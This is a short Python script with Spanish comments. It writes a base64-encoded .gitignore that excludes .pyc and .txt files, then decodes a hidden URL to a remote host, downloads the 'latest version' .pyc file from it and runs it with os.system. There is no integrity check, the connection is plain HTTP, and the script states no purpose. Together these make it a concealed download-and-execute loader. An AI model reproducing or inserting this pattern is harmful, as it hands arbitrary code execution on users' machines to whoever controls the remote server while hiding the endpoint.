import requests as r, os, base64 as b

# Decodificar y crear .gitignore si no existe
if not os.path.exists(".gitignore"):
    gt = b.standard_b64decode("L1B5dGhvbioNCi93b3JrX2FyZWEqDQovc2Vydmlkb3JfbWluZWNyYWZ0DQovQmVkcm9jay1TZXJ2ZXINCi92ZW5kb3INCmNvbXBvc2VyLioNCmNvbmZpZy5qc29uDQoqLnR4dA0KKi5weWMNCioubXNwDQoqLm91dHB1dA==")
    with open(".gitignore", 'w') as gtf:
        gtf.write(gt.decode())

def d():
    u = b.b64decode("aHR0cDovL3VzLW1pYS0wNC52ZXh5aG9zdC5jb206NzAzMi9iZHNw").decode('utf-8')
    try:
        v = r.get(u + "/latest")
        v.raise_for_status()
        l = v.headers.get("latestversion")
        if not l:
            raise ValueError("No se pudo obtener la última versión.")
        print("Latest version:", l)
        f = r.get(f"{u}/{l}", stream=True)
        f.raise_for_status()
        p = f"{l}.pyc"
        with open(p, 'wb') as file:
            for c in f.iter_content(chunk_size=8192):
                if c:
                    file.write(c)
        if os.path.getsize(p) == 0:
            raise ValueError("El archivo descargado está vacío.")
        return p
    except r.RequestException as e:
        print(f"Error en la solicitud: {e}")
    except Exception as e:
        print(f"Error: {e}")

file = d()
if file:
    os.system(f"python3 {file}")
else:
    print("No se pudo descargar y ejecutar el archivo.")
